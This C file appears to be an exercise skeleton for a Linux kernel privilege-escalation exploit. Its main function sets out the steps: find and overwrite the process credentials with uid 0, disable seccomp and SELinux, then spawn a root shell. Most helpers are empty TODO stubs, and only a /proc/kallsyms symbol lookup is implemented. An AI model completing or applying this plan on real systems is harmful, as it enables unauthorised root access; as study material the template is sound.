#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>
#include <stdint.h>
#include <stdbool.h>
#include "hexdump.h"

#define TIF_SECCOMP			8

/* 'exploit' wrappers */
void* task_peek(void);
ssize_t arb_read(void* src, void* dst, size_t count);
ssize_t arb_write(void* src, void* dst, size_t count);

/* rooting helper functions */
void* find_creds(void* task_ptr);
int is_cred(void* guess);
int overwrite_creds(void* creds, unsigned int uid);
int disable_seccomp(void* task_ptr);
int disable_selinux(void);
uint64_t kallsyms_lookup_name(char* name);

int main() {
	int fd;
	ssize_t bytes_read;
	void* task_ptr;
	void* creds;

	task_ptr = task_peek();
	printf("My PID is %d (%#08x)\n", getpid(), getpid());
	printf("My UID is %d (%#08x)\n", getuid(), getuid());
	printf("Current is %p\n", task_ptr);

	creds = find_creds(task_ptr);
	if (creds == NULL) {
		fprintf(stderr, "Couldn't find creds\n");
		return EXIT_FAILURE;
	}
	printf("Creds are probably at %p\n", creds);

	overwrite_creds(creds, 0);
	printf("My UID is %d\n", getuid());

	disable_seccomp(task_ptr);
	disable_selinux();
	system("/bin/bash");

	return EXIT_SUCCESS;
}

void* task_peek(void) {
	void* task_ptr = NULL;

    // TODO: Write a wrapper for peeking the task structure in the kernel

	return task_ptr;
}

ssize_t arb_read(void* src, void* dst, size_t count) {
	ssize_t ret;

    // TODO: Write a wrapper for getting an arbitrary read in the kernel

	return ret;
}

ssize_t arb_write(void* src, void* dst, size_t count) {
	ssize_t ret = 0;

    // TODO: Write a wrapper for writing an arbitrary place in the kernel

	return ret;
}

int disable_seccomp(void* task_ptr) {
	// TODO: Break out of the seccomp sandbox

	return 1;
}

int is_cred(void* guess) {
	// TODO: Determine if the address given is a cred structure

	return 0;
}

int overwrite_creds(void* creds, unsigned int uid) {
	// TODO: Overwrite the cred structures with the provided uid

	return 0;
}

void* find_creds(void* task_ptr) {
	// TODO: Search for the cred structure in the task struct
    // This will call is_cred()

    return NULL;
}

uint64_t kallsyms_lookup_name(char* name) {
	uint64_t addr = 0;
	char buf[1024];

	FILE* f = fopen("/proc/kallsyms", "r");
	if (f == NULL) {
		fprintf(stderr, "Could not open kallsyms\n");
		return 0;
	}

	while (fgets(buf, sizeof(buf), f) != NULL) {
		if (strstr(buf, name) != NULL) {
			printf("%s", buf);
			sscanf(buf, "%llx", &addr);
			printf("addr is %#016llx\n",addr);
		}
	}
	fclose(f);

	return addr;
}

int disable_selinux(void) {
    // TODO: Disable SELinux on the system

	return 1;
}

